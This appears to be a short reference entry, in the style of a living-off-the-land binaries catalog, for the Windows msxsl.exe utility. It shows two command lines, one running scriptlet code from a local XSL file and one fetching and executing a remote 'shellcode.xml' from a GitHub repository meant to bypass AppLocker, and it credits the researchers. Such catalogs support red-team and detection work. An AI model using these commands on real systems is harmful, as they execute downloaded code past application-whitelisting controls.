## msxsl.exe
* Functions: Execute
```

msxsl.exe customers.xml script.xsl
Run COM Scriptlet code within the script.xsl file (local).

msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
```
   
* Resources:   
  * https://twitter.com/subTee/status/877616321747271680
  * https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
   
* Full path:   
  * N/A
   
* Notes: Thanks to Casey Smith - @subTee (Finding), 3gstudent - @3gstudent (Remote)  
   
